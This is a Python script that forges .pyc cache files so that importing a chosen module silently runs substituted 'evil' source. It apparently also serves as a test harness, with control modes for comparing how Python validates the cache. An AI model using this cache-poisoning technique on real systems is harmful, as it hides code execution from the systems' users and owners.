# forge.py MODE EVIL_SRC TARGET_PY [OPT]  -- write a pyc for TARGET_PY whose code is EVIL_SRC.
# MODE: unchecked | checked | timestamp | stale | genuine | genuine-unchecked
import sys, os, marshal, struct, importlib.util, _imp
mode, evil, target = sys.argv[1:4]
opt = sys.argv[4] if len(sys.argv) > 4 else ''
tag = sys.implementation.cache_tag
d = os.path.join(os.path.dirname(os.path.abspath(target)), '__pycache__')
os.makedirs(d, exist_ok=True)
stem = os.path.basename(target)[:-3]
out = os.path.join(d, f"{stem}.{tag}{'.opt-' + opt if opt else ''}.pyc")
tsrc = open(target, 'rb').read()
src = tsrc if mode.startswith('genuine') else open(evil, 'rb').read()
code = compile(src, os.path.abspath(target), 'exec', dont_inherit=True, optimize=int(opt or 0))
magic = importlib.util.MAGIC_NUMBER
if mode in ('unchecked', 'genuine-unchecked'):
    hdr = magic + struct.pack('<I', 1) + _imp.source_hash(importlib.util._RAW_MAGIC_NUMBER if hasattr(importlib.util, '_RAW_MAGIC_NUMBER') else int.from_bytes(magic, 'little'), tsrc)
elif mode == 'checked':
    hdr = magic + struct.pack('<I', 3) + _imp.source_hash(int.from_bytes(magic, 'little'), src)
elif mode in ('timestamp', 'genuine'):
    st = os.stat(target)
    hdr = magic + struct.pack('<II', 0, int(st.st_mtime) & 0xFFFFFFFF) + struct.pack('<I', st.st_size & 0xFFFFFFFF)
elif mode == 'stale':
    st = os.stat(target)
    hdr = magic + struct.pack('<II', 0, (int(st.st_mtime) - 1000) & 0xFFFFFFFF) + struct.pack('<I', st.st_size & 0xFFFFFFFF)
open(out, 'wb').write(hdr + marshal.dumps(code))
print('wrote', out, mode, len(hdr))
